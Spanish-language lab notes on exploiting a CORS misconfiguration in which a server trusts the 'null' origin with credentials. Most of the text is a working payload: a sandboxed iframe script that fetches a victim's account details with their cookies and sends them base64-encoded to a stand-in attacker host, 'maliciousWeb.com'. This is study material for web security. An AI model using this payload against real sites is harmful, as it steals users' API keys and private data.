# CORS con origen null marcado como confiable

Tags: #CORS 

```bash 
En este lab se analiza las configuraciones inseguras de CORS, centrándose en un caso donde el servidor confía en peticiones con origen 'null'. Este tipo de comportamiento suele verse cuando se permiten solicitudes desde documentos cargados mediante iframes con 'sandbox' y 'srcdoc', lo cual representa un riesgo si además se permite el uso de cookies mediante 'Access-Control-Allow-Credentials'.


- Access-Control-Allow-Credentials 'True': Permite que el navegador envíe cookies, tokens de sesión u otros datos de autenticación en la solicitud

- Access-Control-Allow-Origin: Esta cabecera solo aparecerá si el origen es 'null' en este lab
```

```javascript 
// Indicar una estructura de código que quieres que se ingrese en el 'iframe'

	<iframe sandbox="allow-scripts" srcdoc="<h1>Hola</h1>"></iframe>   
```

```javascript 
// Este lab permite el origen 'null'. Por lo que se coloca todo dentro de un 'iframe' ya que cuando se envia desde dentro el origen es 'null' 

<iframe sandbox="allow-scripts" srcdoc="<script>
		var req = new XMLHttpRequest();
		req.onload = function() {
			location = 'https://maliciousWeb.com/?apiKey=' + btoa(req.responseText);   // Forzar a la víctima a que tramite una solicitud por GET al servidor de atacante para que envie el contenido de la respuesta en base64
		};
		req.open('GET', 'https://web.com/accountDetails', true);
		req.withCredentials = true;    // Arrastrar la cookie de sesión de la víctima 
		req.send();
	</script>"></iframe>


Notas:
	1. Necesitas una sesión activa de la víctima que visita la página maliciosa 
	2. req.open(true) = Asíncrona para que no continue el flujo hasta que no se tenga la respuesta 
	3. sandbox = Inicias con privilegios minimos y le indicas que es lo único que se quiere ejecutar 
```

```bash 
❯ echo -n 'base64Code' |  base64 -d | jq 

	# base64 -d = Decodear el código que se encuentra en base64 
	# jq = Procesar la data en Json 
```